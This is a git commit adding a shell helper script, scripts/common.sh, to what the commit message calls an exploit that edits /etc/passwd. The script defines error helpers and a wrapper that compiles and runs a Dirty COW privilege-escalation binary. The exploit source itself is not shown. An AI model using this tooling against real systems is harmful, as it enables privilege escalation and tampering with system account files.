952f86f13c3c8bb19e7ad47171041c414810e013
jk977 <jdk64@comcast.net>
2020-11-28 21:34:42 -0800

    Add exploit script that edits /etc/passwd

---
+++ scripts/common.sh
@@ -0,0 +1,22 @@
+export scriptdir="$(dirname "$0")"
+export appdir="$scriptdir/../app"
+
+echoerr() {
+	echo "$@" >&2
+}
+
+die() {
+	echoerr "$@"
+	exit 1
+}
+
+dirtycow() {
+	local exe="$appdir/dirtycow"
+
+	if [ ! -x "$exe" ]; then
+		make -C "$appdir" || die "Failed to compile Dirty COW exploit."
+		[ -x "$exe" ]	  || die "Executable not found: $exe"
+	fi
+
+	"$exe" $@
+}
